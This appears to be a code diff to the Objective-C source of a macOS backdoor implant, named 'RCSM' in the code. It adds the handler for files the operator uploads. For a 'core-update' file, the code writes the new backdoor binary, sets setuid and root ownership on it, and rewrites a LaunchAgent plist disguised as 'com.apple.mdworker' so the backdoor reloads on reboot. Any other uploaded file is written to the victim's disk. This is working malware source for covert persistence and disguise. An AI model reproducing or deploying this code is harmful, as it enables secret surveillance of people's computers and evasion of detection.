@@ -14,6 +14,8 @@
 #import "NSData+Pascal.h"
 #import "RCSMCommon.h"
 
+#import "RCSMFileSystemManager.h"
+
 //#define DEBUG_UP_NOP
 
 
@@ -24,7 +26,6 @@
   if (self = [super init])
     {
       mTransport = aTransport;
-      mUploads = [[NSMutableArray alloc] init];
     
 #ifdef DEBUG_UP_NOP
       infoLog(ME, @"mTransport: %@", mTransport);
@@ -37,7 +38,6 @@
 
 - (void)dealloc
 {
-  [mUploads release];
   [super dealloc];
 }
 
@@ -219,7 +219,92 @@
       infoLog(ME, @"file content: %@", fileContent);
 #endif
       
-      // TODO: Do file upload
+      if ([filename isEqualToString: @"core-update"])
+        {
+#ifdef DEBUG_UP_NOP
+          infoLog(ME, @"Received a core upgrade");
+#endif
+          BOOL success = NO;
+          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                                    [[NSBundle mainBundle] bundlePath],
+                                    gBackdoorUpdateName];
+          
+          [fileContent writeToFile: _upgradePath
+                        atomically: YES];
+          
+          //
+          // Forcing suid permission on the backdoor upgrade
+          //
+          u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
+          NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
+          NSValue *owner      = [NSNumber numberWithInt: 0];
+          
+          NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
+                                          permission,
+                                          NSFilePosixPermissions,
+                                          owner,
+                                          NSFileOwnerAccountID,
+                                          nil];
+          
+          success = [[NSFileManager defaultManager] setAttributes: tempDictionary
+                                                     ofItemAtPath: _upgradePath
+                                                            error: nil];
+          
+          if (success == NO)
+            {
+#ifdef DEBUG
+              errorLog(ME, @"Error while changing attributes on the upgrade file");
+#endif
+            }
+          
+          [_upgradePath release];
+          
+          //
+          // Once the backdoor has been written, edit the backdoor Loader in order to
+          // load the new updated backdoor upon reboot
+          //
+          NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
+                                           NSHomeDirectory(),
+                                           BACKDOOR_DAEMON_PLIST ];
+          
+          NSString *_backdoorPath = [[[NSBundle mainBundle] executablePath]
+                                     stringByReplacingOccurrencesOfString: gBackdoorName
+                                                               withString: gBackdoorUpdateName];
+          
+          [[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
+                                                     error: nil];
+          
+          NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
+          NSDictionary *innerDict;
+          
+          innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
+                       @"com.apple.mdworker", @"Label",
+                       [NSNumber numberWithBool: FALSE], @"OnDemand",
+                       [NSArray arrayWithObjects: _backdoorPath, nil], @"ProgramArguments", nil];
+          //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
+          
+          [rootObj addEntriesFromDictionary: innerDict];
+          success = [rootObj writeToFile: backdoorLaunchAgent
+                              atomically: NO];
+          
+          if (success == NO)
+            {
+#ifdef DEBUG_UP_NOP
+              errorLog(ME, @"Error while writing backdoor launchAgent plist");
+#endif
+            }
+        }
+      else
+        {
+#ifdef DEBUG_UP_NOP
+          infoLog(ME, @"Received standard file");
+#endif
+          RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
+          
+          [fsManager createFile: filename
+                       withData: fileContent];
+          [fsManager release];
+        }
     }
 
   [fileContent release];
